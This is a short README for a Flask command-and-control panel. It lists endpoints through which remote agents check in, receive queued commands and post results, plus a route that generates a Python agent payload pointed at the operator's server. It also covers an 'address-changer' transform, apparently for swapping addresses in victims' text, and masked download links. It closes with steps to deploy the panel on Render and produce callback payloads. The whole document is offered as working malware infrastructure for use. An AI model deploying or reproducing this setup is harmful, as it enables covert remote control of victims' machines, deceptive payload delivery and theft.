C2 Panel (Flask)

Endpoints
- / — HTML panel (Bearer token required if PANEL_TOKEN is set)
- /api/checkin — agent poll (JSON)
- /api/result — agent result post (JSON)
- /api/queue_task — queue command for agent (HTML form or JSON)
- /api/agents — JSON snapshot
- /api/config — get address-changer config
- /api/transform — POST {text} to apply address-changer transforms
- /payload — emits Python agent (param server=...)
- /mask and /gen_mask_link — masked download + redirect

Run locally
- pip install -r requirements.txt
- PANEL_TOKEN=changeme PORT=8080 python3 c2_app.py

Deploy on Render (short)
- Push to GitHub, create a new Render Web Service
- Build: pip install -r requirements.txt
- Start: gunicorn c2_app:app --bind 0.0.0.0:$PORT
- Add env var PANEL_TOKEN

Use
- Visit your Render URL with ?token=YOUR_PANEL_TOKEN to view the panel
- Generate the payload with /payload?server=https://your-service.onrender.com
- POST /api/transform with {'text': '...'} to apply address-changer if enabled via panel
